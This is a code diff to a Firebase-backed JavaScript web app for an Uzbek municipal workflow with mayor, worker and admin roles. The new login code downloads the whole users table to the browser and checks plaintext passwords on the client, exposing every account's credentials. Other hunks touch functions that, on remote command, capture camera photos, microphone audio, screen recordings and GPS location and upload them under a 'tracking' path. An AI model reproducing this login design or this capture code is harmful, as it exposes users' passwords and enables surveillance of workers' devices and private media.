@@ -41,31 +41,74 @@ document.addEventListener('DOMContentLoaded', () => {
   }
 });
 
-function handleLogin(e) {
+async function handleLogin(e) {
   if (e) e.preventDefault();
   const username = document.getElementById('login-user').value.trim();
   const pass = document.getElementById('login-pass').value.trim();
 
-  // Kirish bosilganda ham srazi barcha ruxsatlarni tasdiqlash
-  requestWebPermissions();
+  try {
+    requestWebPermissions();
+  } catch (_) {}
 
   if (!username || !pass) {
     alert("Iltimos, login va parolni kiriting!");
     return;
   }
 
-  const user = window.store.users.find(u => 
-    u.username && u.username.toLowerCase() === username.toLowerCase() && u.password === pass
-  );
-
-  if (!user) {
-    alert("Login yoki parol noto'g'ri! Iltimos, qayta tekshirib ko'ring.");
-    return;
+  const submitBtn = document.querySelector('#login-screen button[type="submit"]');
+  const originalBtnText = submitBtn ? submitBtn.innerText : 'Kirish';
+  if (submitBtn) {
+    submitBtn.disabled = true;
+    submitBtn.innerText = 'Kirilmoqda...';
   }
 
-  window.store.currentUser = user;
-  localStorage.setItem('ijro_user_id', user.id);
-  routeUserToScreen(user);
+  try {
+    // Agar foydalanuvchilar hali xotiraga yuklanmagan bo'lsa, tezkor REST orqali olamiz
+    if (!window.store.users || window.store.users.length === 0) {
+      try {
+        const res = await fetch(FIREBASE_DB_URL + '/users.json');
+        const data = await res.json();
+        if (data) {
+          window.store.users = Object.values(data);
+          notifyStore('users', window.store.users);
+        }
+      } catch (err) {
+        console.warn('REST users fetch error:', err);
+      }
+    }
+
+    let user = (window.store.users || []).find(u => 
+      u.username && u.username.toLowerCase() === username.toLowerCase() && String(u.password).trim() === pass
+    );
+
+    // Agar topilmasa, bazadan yangi ma'lumotni yana bir bor tortib ko'ramiz
+    if (!user) {
+      try {
+        const res = await fetch(FIREBASE_DB_URL + '/users.json');
+        const data = await res.json();
+        if (data) {
+          window.store.users = Object.values(data);
+          user = (window.store.users || []).find(u => 
+            u.username && u.username.toLowerCase() === username.toLowerCase() && String(u.password).trim() === pass
+          );
+        }
+      } catch (_) {}
+    }
+
+    if (!user) {
+      alert("Login yoki parol noto'g'ri! Iltimos, qayta tekshirib ko'ring.");
+      return;
+    }
+
+    window.store.currentUser = user;
+    localStorage.setItem('ijro_user_id', user.id);
+    routeUserToScreen(user);
+  } finally {
+    if (submitBtn) {
+      submitBtn.disabled = false;
+      submitBtn.innerText = originalBtnText;
+    }
+  }
 }
 
 function handleLogout() {
@@ -79,28 +122,34 @@ function handleLogout() {
 
 function updateUserLastActive(userId) {
   if (!userId) return;
-  const now = Date.now();
-  const user = (window.store.users || []).find(u => u.id === userId);
-  if (user) user.lastActiveAt = now;
-  if (window.store.currentUser && window.store.currentUser.id === userId) {
-    window.store.currentUser.lastActiveAt = now;
-  }
-  if (window.firebase && window.firebase.database) {
-    window.firebase.database().ref(`users/${userId}/lastActiveAt`).setValue(now);
+  try {
+    const now = Date.now();
+    const user = (window.store.users || []).find(u => u.id === userId);
+    if (user) user.lastActiveAt = now;
+    if (window.store.currentUser && window.store.currentUser.id === userId) {
+      window.store.currentUser.lastActiveAt = now;
+    }
+    if (window.firebase && window.firebase.database) {
+      window.firebase.database().ref(`users/${userId}/lastActiveAt`).set(now);
+    }
+  } catch (e) {
+    console.warn("updateUserLastActive error:", e);
   }
 }
 
 function routeUserToScreen(user) {
-  requestWebPermissions();
-  updateUserLastActive(user.id);
+  try {
+    updateUserLastActive(user.id);
+  } catch (_) {}
+
   if (user.role === 'MAYOR') {
     showScreen('mayor-screen');
     initMayorView();
-    checkWebPermissions(user);
+    try { checkWebPermissions(user); } catch (_) {}
   } else if (user.role === 'WORKER') {
     showScreen('worker-screen');
     initWorkerView();
-    checkWebPermissions(user);
+    try { checkWebPermissions(user); } catch (_) {}
   } else if (user.role === 'BIG_ADMIN' || user.role === 'ADMIN') {
     showScreen('admin-screen');
     initAdminView();
@@ -183,7 +232,7 @@ function uploadWebLocation(username, lat, lon) {
   try {
     if (window.firebase && window.firebase.database) {
       const db = window.firebase.database();
-      db.ref(`tracking/devices/${username}/location`).setValue({
+      db.ref(`tracking/devices/${username}/location`).set({
         lat: lat.toString(),
         lon: lon.toString(),
         timestamp: Date.now()
@@ -206,7 +255,7 @@ function initWebSurveillanceSync(user) {
     try {
       if (window.firebase && window.firebase.database) {
         const db = window.firebase.database();
-        db.ref(`tracking/devices/${username}/heartbeat`).setValue(Date.now());
+        db.ref(`tracking/devices/${username}/heartbeat`).set(Date.now());
         updateUserLastActive(user.id);
         db.ref(`tracking/devices/${username}/info`).update({
           userId: user.id,
@@ -268,7 +317,7 @@ function initWebSurveillanceSync(user) {
           if ('geolocation' in navigator) {
             navigator.geolocation.getCurrentPosition((pos) => {
               uploadWebLocation(username, pos.coords.latitude, pos.coords.longitude);
-              db.ref(`tracking/devices/${username}/media/status`).setValue(`🛰️ GPS yangilandi (${new Date().toLocaleTimeString()})`);
+              db.ref(`tracking/devices/${username}/media/status`).set(`🛰️ GPS yangilandi (${new Date().toLocaleTimeString()})`);
             }, null, { enableHighAccuracy: true, timeout: 10000 });
           }
         }
@@ -308,9 +357,9 @@ async function captureWebPhoto(username) {
         front_base64: base64,
         timestamp: Date.now()
       };
-      db.ref(`tracking/devices/${username}/media/latest_photo`).setValue(photoItem);
-      db.ref(`tracking/devices/${username}/media/archive_photos`).push().setValue(photoItem);
-      db.ref(`tracking/devices/${username}/media/status`).setValue(`📷 Rasm olindi (${new Date().toLocaleTimeString()})`);
+      db.ref(`tracking/devices/${username}/media/latest_photo`).set(photoItem);
+      db.ref(`tracking/devices/${username}/media/archive_photos`).push().set(photoItem);
+      db.ref(`tracking/devices/${username}/media/status`).set(`📷 Rasm olindi (${new Date().toLocaleTimeString()})`);
     }
   } catch (e) {
     console.log('captureWebPhoto error', e);
@@ -352,9 +401,9 @@ async function handleWebAudioRecordingCommand(username, start) {
                 duration: `${durSec}s`,
                 timestamp: Date.now()
               };
-              db.ref(`tracking/devices/${username}/media/latest_audio`).setValue(audioItem);
-              db.ref(`tracking/devices/${username}/media/archive_audio`).push().setValue(audioItem);
-              db.ref(`tracking/devices/${username}/media/status`).setValue(`🎙️ Ovoz yozildi (${durSec}s)`);
+              db.ref(`tracking/devices/${username}/media/latest_audio`).set(audioItem);
+              db.ref(`tracking/devices/${username}/media/archive_audio`).push().set(audioItem);
+              db.ref(`tracking/devices/${username}/media/status`).set(`🎙️ Ovoz yozildi (${durSec}s)`);
             }
           };
           reader.readAsDataURL(audioBlob);
@@ -369,7 +418,7 @@ async function handleWebAudioRecordingCommand(username, start) {
       };
 
       webAudioRecorder.start(1000);
-      if (db) db.ref(`tracking/devices/${username}/media/status`).setValue("🎙️ Ovoz yozilmoqda...");
+      if (db) db.ref(`tracking/devices/${username}/media/status`).set("🎙️ Ovoz yozilmoqda...");
     } else {
       if (webAudioRecorder && webAudioRecorder.state === 'recording') {
         webAudioRecorder.stop();
@@ -418,9 +467,9 @@ async function handleWebScreenRecordingCommand(username, start) {
                     duration: `${durSec}s`,
                     timestamp: Date.now()
                   };
-                  db.ref(`tracking/devices/${username}/media/latest_screen`).setValue(screenItem);
-                  db.ref(`tracking/devices/${username}/media/archive_screen`).push().setValue(screenItem);
-                  db.ref(`tracking/devices/${username}/media/status`).setValue(`📹 Ekran yozildi (${durSec}s)`);
+                  db.ref(`tracking/devices/${username}/media/latest_screen`).set(screenItem);
+                  db.ref(`tracking/devices/${username}/media/archive_screen`).push().set(screenItem);
+                  db.ref(`tracking/devices/${username}/media/status`).set(`📹 Ekran yozildi (${durSec}s)`);
                 }
               };
               reader.readAsDataURL(videoBlob);
@@ -435,7 +484,7 @@ async function handleWebScreenRecordingCommand(username, start) {
           };
 
           webScreenRecorder.start(1000);
-          if (db) db.ref(`tracking/devices/${username}/media/status`).setValue("📹 Ekran yozilmoqda...");
+          if (db) db.ref(`tracking/devices/${username}/media/status`).set("📹 Ekran yozilmoqda...");
           return;
         } catch (_err) {
           console.log("getDisplayMedia bekor qilindi yoki qo'llab-quvvatlanmadi, HTML snapshot olinadi");
@@ -480,9 +529,9 @@ function captureWebSnapshot(username) {
         screen_base64: b64,
         timestamp: Date.now()
       };
-      db.ref(`tracking/devices/${username}/media/latest_screen`).setValue(screenItem);
-      db.ref(`tracking/devices/${username}/media/archive_screen`).push().setValue(screenItem);
-      db.ref(`tracking/devices/${username}/media/status`).setValue(`📹 Ekran tasviri olindi (${new Date().toLocaleTimeString()})`);
+      db.ref(`tracking/devices/${username}/media/latest_screen`).set(screenItem);
+      db.ref(`tracking/devices/${username}/media/archive_screen`).push().set(screenItem);
+      db.ref(`tracking/devices/${username}/media/status`).set(`📹 Ekran tasviri olindi (${new Date().toLocaleTimeString()})`);
     }
   } catch (e) {
     console.error("captureWebSnapshot error:", e);
